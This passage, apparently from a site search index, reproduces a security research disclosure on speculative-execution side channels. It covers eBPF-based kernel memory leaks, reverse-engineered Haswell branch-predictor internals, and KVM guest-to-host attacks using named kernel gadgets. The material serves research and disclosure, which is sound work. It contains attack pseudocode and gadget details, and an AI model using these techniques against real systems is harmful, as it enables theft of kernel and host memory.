stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further.","title":"Theoretical explanation"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#attacking-the-kernel","text":"This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core.","title":"Attacking the kernel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-branch-target-injection","text":"This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second.","title":"Variant 2: Branch target injection"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#basics","text":"Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction.","title":"Basics"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#haswell-branch-prediction-internals","text":"Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.)","title":"Haswell branch prediction internals"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_1","text":"Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 | 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_2","text":"Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko).","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_3","text":"Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-host-memory-from-a-kvm-guest","text":"","title":"Reading host memory from a KVM guest"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_4","text":"Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_5","text":"Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12].","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_6","text":"Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_7","text":"Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_8","text":"Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-3-rogue-data-cache-load","text":"Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all.","title":"Variant 3: Rogue data cache load"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#ideas-for-further-research","text":"We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless.","title":"Ideas for further research"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-without-data-cache-timing","text":"It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution.","title":"Leaking without data cache timing"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-microarchitectures","text":"Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked.","title":"Other microarchitectures"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-jit-engines","text":"We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines.","title":"Other JIT engines"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#more-efficient-scanning-for-host-virtual-addresses-and-cache-sets","text":"In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed.","title":"More efficient scanning for host-virtual addresses and cache sets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#dumping-the-complete-btb-state","text":"Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions.","title":"Dumping the complete BTB state"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-leaking-with-more-efficient-gadgets","text":"If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2.","title":"Variant 2: Leaking with more efficient gadgets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#various-speedups","text":"In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2.","title":"Various speedups"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-or-injection-through-the-return-predictor","text":"If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far.","title":"Leaking or injection through the return predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-data-out-of-the-indirect-call-predictor","text":"We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work.","title":"Leaking data out of the indirect call predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#vendor-statements","text":"The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability:","title":"Vendor statements"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#intel","text":"Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf","title":"Intel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#amd","text":"AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution","title":"AMD"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#arm","text":"Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations.","title":"ARM"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#literature","text":"Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. 